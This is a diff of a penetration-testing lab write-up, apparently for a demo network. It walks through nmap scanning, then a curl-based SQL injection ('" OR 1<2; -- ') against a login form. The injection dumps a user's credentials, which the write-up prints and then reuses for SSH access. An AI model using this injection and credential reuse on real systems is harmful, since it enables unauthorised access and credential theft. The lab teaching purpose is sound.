@@ -31,7 +31,7 @@ During the demostration scenario we found out these IP:
 And we don't have any access to the Web network
 
 
-# Instruction how to do it
+# Instruction: what to do
 1. Footprinting: gather information online about the organization
 2. Scanning: scan vulnerable point of access
 3. Enumeration: probing more intrusive of vulnerable services
@@ -42,7 +42,7 @@ In this case scenario we're already connected to the local network, so we've alr
 ## Scanning
 We start find out our IP address on the networks using ```ifconfig``` command, and we found out.
 
-Using then nmap tool with these options:
+Using then ```nmap``` tool with these options:
 * “-sn” means “no port scan”
 * “-PE” sends ICMP Echo Request
 * “--send-ip” to not send ARP packets
@@ -65,13 +65,48 @@ If we use simply a TPC SYN scan from nmap, we find vague information:
 Else, if we explore more with a Version Detection scan, we can scan even beyond the typical use of a port like 8080:
 
 ![Web Server SV scan](Image/webserver_sv.png)
-and we find about a web server open on port 8080
+and we find about a web server open on port 8080. 
 
+Meanwhile on Tom PC we found an open SSH port
+![Tom PC SV scan](Image/tom_sv.png)
+We can think about SSH after getting information about the site.
 Now we can find about this site (in a real case scenario we should use DirBuster to map the entire site) and the main page.
-![Wget webserver](Image/webserver_wget.png)
+![cURL webserver](Image/webserver_curl.png)
+We retrived the html page using ```curl``` and found out about a login form, which we can try to exploit.
 
 ## Exploitation
+We can try some usual combination for the form
+```bash
+curl -X POST -d 'username=a&password=b' 172.19.0.4:8080
+````
+Which returns "Error value(s) missing"
+```bash
+curl -X POST -d 'username=&password=b' 172.19.0.4:8080
+```
+Which returns
+
+ `{"success":false,"response":"No user found","result":[]}`
+ 
+and we can try last one with MySQL injection using OR and commenting syntax
+```bash
+curl -X POST -d 'username=" OR 1<2; -- &password=b' 172.19.0.4:8080 
+```
+which return us a bunch of credentials
+![Web Server SQL](Image/webserver_sql.png)
+including only one user called Tom with:
+```
+username = tcasaccio1
+password = YLN1NrMdGN
+```
+
+## SSH Access
+Now that we gather those information, we can hope that the only user we know has the same user and password as this database.
+
+We can try to log in using:
+```bash
+ssh tcasaccio1@172.20.0.3
+```
+
+
 
 # SQL Injection Procedure
-
-`" OR 1<2; -- `
